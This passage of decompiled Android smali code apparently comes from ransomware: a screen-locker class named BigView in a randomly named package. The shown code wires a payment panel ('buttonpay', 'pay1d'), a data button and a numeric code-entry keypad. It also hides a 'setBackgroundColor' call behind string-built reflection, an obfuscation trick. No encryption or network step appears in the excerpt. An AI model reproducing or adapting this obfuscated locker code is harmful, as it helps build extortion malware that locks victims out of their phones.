    const/16 v42, 0x8

    move-object/from16 v0, v25

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;->gett(I)V

    .line 1282
    const v42, 0x7f08005b

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v15

    check-cast v15, Landroid/widget/TextView;

    .line 1284
    .local v15, "text1t3":Landroid/widget/TextView;
    new-instance v26, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;

    move-object/from16 v0, v26

    invoke-direct {v0, v15}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;-><init>(Landroid/widget/TextView;)V

    .line 1285
    .local v26, "wewe13":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;
    const/16 v42, 0x8

    move-object/from16 v0, v26

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;->gett(I)V

    .line 1286
    const v42, 0x7f08005c

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v18

    check-cast v18, Landroid/widget/TextView;

    .line 1288
    .local v18, "text2t3":Landroid/widget/TextView;
    new-instance v27, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;

    move-object/from16 v0, v27

    move-object/from16 v1, v18

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;-><init>(Landroid/widget/TextView;)V

    .line 1289
    .local v27, "wewe14":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;
    const/16 v42, 0x8

    move-object/from16 v0, v27

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;->gett(I)V

    .line 1290
    const v42, 0x7f08005d

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v21

    check-cast v21, Landroid/widget/TextView;

    .line 1292
    .local v21, "text4t3":Landroid/widget/TextView;
    new-instance v28, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;

    move-object/from16 v0, v28

    move-object/from16 v1, v21

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;-><init>(Landroid/widget/TextView;)V

    .line 1293
    .local v28, "wewe15":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;
    const/16 v42, 0x8

    move-object/from16 v0, v28

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;->gett(I)V

    .line 1295
    const v42, 0x7f08004c

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v10

    check-cast v10, Landroid/widget/LinearLayout;

    .line 1297
    .local v10, "pay1d":Landroid/widget/LinearLayout;
    new-instance v29, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v29

    invoke-direct {v0, v10}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1298
    .local v29, "wewe16":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v42, 0x0

    move-object/from16 v0, v29

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1299
    const v42, 0x7f08004e

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/ImageView;

    .line 1301
    .local v3, "logo1d":Landroid/widget/ImageView;
    new-instance v30, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;

    move-object/from16 v0, v30

    invoke-direct {v0, v3}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;-><init>(Landroid/widget/ImageView;)V

    .line 1302
    .local v30, "wewe17":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;
    const/16 v42, 0x0

    move-object/from16 v0, v30

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;->gett(I)V

    .line 1303
    const v42, 0x7f080054

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/TextView;

    .line 1305
    .local v4, "logo1t":Landroid/widget/TextView;
    new-instance v31, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;

    move-object/from16 v0, v31

    invoke-direct {v0, v4}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;-><init>(Landroid/widget/TextView;)V

    .line 1306
    .local v31, "wewe18":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;
    const/16 v42, 0x0

    move-object/from16 v0, v31

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;->gett(I)V

    .line 1307
    const v42, 0x7f080058

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/TextView;

    .line 1309
    .local v5, "logo1t2":Landroid/widget/TextView;
    new-instance v32, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;

    move-object/from16 v0, v32

    invoke-direct {v0, v5}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;-><init>(Landroid/widget/TextView;)V

    .line 1310
    .local v32, "wewe19":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;
    const/16 v42, 0x0

    move-object/from16 v0, v32

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;->gett(I)V

    .line 1311
    const v42, 0x7f08005b

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/TextView;

    .line 1313
    .local v6, "logo1t3":Landroid/widget/TextView;
    new-instance v34, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;

    move-object/from16 v0, v34

    invoke-direct {v0, v6}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;-><init>(Landroid/widget/TextView;)V

    .line 1314
    .local v34, "wewe20":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;
    const/16 v42, 0x0

    move-object/from16 v0, v34

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;->gett(I)V

    .line 1316
    return-void
.end method

.method public startinfo()V
    .locals 66

    .prologue
    .line 488
    const-string v61, "page1"

    move-object/from16 v0, p0

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->showpage(Ljava/lang/String;)V

    .line 489
    const v61, 0x7f080072

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v54

    check-cast v54, Landroid/widget/LinearLayout;

    .line 490
    .local v54, "buttonhome":Landroid/widget/LinearLayout;
    :try_start_0
    const-string v61, "android.widget.LinearLayout"

    invoke-static/range {v61 .. v61}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v61

    new-instance v62, Ljava/lang/StringBuilder;

    const-string v63, "setB"

    invoke-direct/range {v62 .. v63}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->fgfghjjklipipi:Ljava/lang/String;

    move-object/from16 v63, v0

    invoke-virtual/range {v62 .. v63}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v62

    const-string v63, "dColor"

    invoke-virtual/range {v62 .. v63}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v62

    invoke-virtual/range {v62 .. v62}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v62

    const/16 v63, 0x1

    move/from16 v0, v63

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v63, v0

    const/16 v64, 0x0

    sget-object v65, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v65, v63, v64

    invoke-virtual/range {v61 .. v63}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v61

    const/16 v62, 0x1

    move/from16 v0, v62

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v62, v0

    const/16 v63, 0x0

    move-object/from16 v0, p0

    iget v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert:I

    move/from16 v64, v0

    invoke-static/range {v64 .. v64}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v64

    aput-object v64, v62, v63

    move-object/from16 v0, v61

    move-object/from16 v1, v54

    move-object/from16 v2, v62

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 492
    :goto_0
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$2;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$2;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v54

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 500
    const v61, 0x7f080074

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/LinearLayout;

    .line 501
    .local v4, "buttonART":Landroid/widget/LinearLayout;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$3;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$3;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v4, v0}, Landroid/widget/LinearLayout;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 509
    const v61, 0x7f080076

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v56

    check-cast v56, Landroid/widget/LinearLayout;

    .line 510
    .local v56, "buttonpay":Landroid/widget/LinearLayout;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$4;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$4;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v56

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 518
    const v61, 0x7f080078

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v53

    check-cast v53, Landroid/widget/LinearLayout;

    .line 519
    .local v53, "buttondata":Landroid/widget/LinearLayout;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$5;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$5;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v53

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 527
    const v61, 0x7f08007a

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v55

    check-cast v55, Landroid/widget/LinearLayout;

    .line 528
    .local v55, "buttoninfo":Landroid/widget/LinearLayout;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$6;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$6;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v55

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 537
    const v61, 0x7f080006

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v42

    check-cast v42, Landroid/widget/Button;

    .line 538
    .local v42, "button_\u00f1_1":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$7;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$7;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v42

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 544
    const v61, 0x7f080007

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v43

    check-cast v43, Landroid/widget/Button;

    .line 545
    .local v43, "button_\u00f1_2":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$8;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$8;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v43

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 551
    const v61, 0x7f080008

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v44

    check-cast v44, Landroid/widget/Button;

    .line 552
    .local v44, "button_\u00f1_3":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$9;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$9;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v44

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 558
    const v61, 0x7f080009

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v45

    check-cast v45, Landroid/widget/Button;

    .line 559
    .local v45, "button_\u00f1_4":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$10;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$10;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v45

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 565
    const v61, 0x7f08000a

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v46

    check-cast v46, Landroid/widget/Button;

    .line 566
    .local v46, "button_\u00f1_5":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$11;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$11;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v46

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 572
    const v61, 0x7f08000c

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v47

    check-cast v47, Landroid/widget/Button;

    .line 573
    .local v47, "button_\u00f1_6":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$12;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$12;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v47

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 579
    const v61, 0x7f08000d

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v48

    check-cast v48, Landroid/widget/Button;

    .line 580
    .local v48, "button_\u00f1_7":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$13;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$13;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v48

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 586
    const v61, 0x7f08000e

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v49

    check-cast v49, Landroid/widget/Button;

    .line 587
    .local v49, "button_\u00f1_8":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$14;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$14;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v49

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 593
    const v61, 0x7f08000f

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v50

    check-cast v50, Landroid/widget/Button;

    .line 594
    .local v50, "button_\u00f1_9":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$15;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$15;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v50

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 600
    const v61, 0x7f080010

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v41

    check-cast v41, Landroid/widget/Button;

    .line 601
    .local v41, "button_\u00f1_0":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$16;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$16;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v41

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 607
    const v61, 0x7f08000b

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v52

    check-cast v52, Landroid/widget/Button;

    .line 608
    .local v52, "button_\u00f1_del":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$17;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$17;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v52

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 614
    const v61, 0x7f080011

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v51

    check-cast v51, Landroid/widget/Button;

    .line 615
    .local v51, "button_\u00f1_clear":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$18;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$18;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v51

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 622
    const v61, 0x7f080063

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v18

    check-cast v18, Landroid/widget/Button;

    .line 623
    .local v18, "button_p_1":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$19;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$19;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v18

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 629
    const v61, 0x7f080064

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v19

    check-cast v19, Landroid/widget/Button;

    .line 630
    .local v19, "button_p_2":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$20;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$20;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v19

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 636
    const v61, 0x7f080065

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v20

    check-cast v20, Landroid/widget/Button;

    .line 637
    .local v20, "button_p_3":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$21;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$21;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v20

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 643
    const v61, 0x7f080066

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v21

    check-cast v21, Landroid/widget/Button;

    .line 644
    .local v21, "button_p_4":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$22;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$22;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v21

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 650
    const v61, 0x7f080067

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v22

    check-cast v22, Landroid/widget/Button;

    .line 651
    .local v22, "button_p_5":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$23;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$23;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v22

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 657
    const v61, 0x7f080069

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v23

    check-cast v23, Landroid/widget/Button;

    .line 658
    .local v23, "button_p_6":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$24;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$24;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v23

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 664
    const v61, 0x7f08006a

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v24

    check-cast v24, Landroid/widget/Button;

    .line 665
    .local v24, "button_p_7":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$25;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$25;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v24

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 671
    const v61, 0x7f08006b

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v25

    check-cast v25, Landroid/widget/Button;

    .line 672
    .local v25, "button_p_8":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$26;

    move-object/from16 v0, v61

